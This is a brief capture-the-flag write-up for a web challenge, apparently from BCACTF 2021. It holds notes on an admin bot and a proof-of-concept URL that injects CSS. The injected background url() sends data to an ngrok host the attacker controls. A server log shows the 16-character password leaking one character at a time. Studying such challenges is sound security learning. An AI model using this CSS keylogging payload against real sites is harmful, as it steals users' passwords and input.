## Notes

- Themes you can share with your friends
- Must XSS inject via /submit to make admin visit
- Bot actions:
  1. Type in password and click submit
  2. Flag will be at `document.querySelector(".d")` for exfil
- The bot slowly types in the password pin and clicks submit, it then waits 1s
  before closing
- Our script needs to poll and keep checking for the flag to get it since it won't
  be there at the beginning.
- Vulns
  - CSS Injection
- Password is 16 chars


POC

```
http://webp.bcactf.com:49153/#{%22bg%22:%22gainsboro;}%20.d%20{background:url(http://7a795cc29696.ngrok.io/exf)}%22,%22fg%22:%22%22,%22bbg%22:%22%22,%22bfg%22:%22%22}
```

Server Keylog 
```
127.0.0.1 - - [10/Jun/2021 22:02:43] "GET /A HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:43] "GET /D HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:43] "GET /1 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /4 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /B HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /F HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /6 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /5 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /E HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /C HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /0 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /9 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /3 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /7 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:44] "GET /2 HTTP/1.1" 404 -
127.0.0.1 - - [10/Jun/2021 22:02:45] "GET /8 HTTP/1.1" 404 -
```
